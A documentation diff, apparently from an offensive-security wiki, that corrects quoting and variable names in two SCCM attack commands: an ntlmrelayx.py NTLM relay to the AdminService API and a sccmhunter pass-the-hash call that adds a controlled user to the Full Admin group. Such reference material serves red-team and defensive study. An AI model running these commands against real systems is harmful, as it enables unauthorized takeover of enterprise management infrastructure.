@@ -216,7 +216,7 @@ The target of the [NTLM relay attack](../../ntlm/relay.md) must be set to the SM
 From UNIX-like systems, [this PR](https://github.com/fortra/impacket/pull/1593) on [Impacket](https://github.com/fortra/impacket)'s [ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python) script can be used for that purpose.
 
 ```bash
-ntlmrelayx.py -t https://smsprovider.$DOMAIN/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "DOMAIN\USER" --displayname "DOMAIN\USER" --objectsid $OBJECTSID
+ntlmrelayx.py -t "https://smsprovider.$DOMAIN/AdminService/wmi/SMS_Admin" -smb2support --adminservice --logonname "$DOMAIN\\$USER" --displayname "$DOMAIN\\$USER" --objectsid $OBJECTSID
 ```
 
 === Windows
@@ -308,7 +308,7 @@ Retrieve the LM:NT hash of the server account.
 Since the active site server must be a member of the SMS Provider administrators (it is member of the `SMS Admins` group), its credentials can be used to add a new controlled user to the `Full Admin` SCCM group. [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) can be used for this purpose.
 
 ```bash
-sccmhunter.py admin -u $ACTIVE_SERVER\$ -p $LMHASH:NTHASH -ip $SMS_PROVIDER_IP
+sccmhunter.py admin -u $ACTIVE_SERVER\$ -p "$LMHASH:$NT_HASH" -ip $SMS_PROVIDER_IP
 
 () (C:\) >> add_admin controlledUser 
 () (C:\) >> show_admins
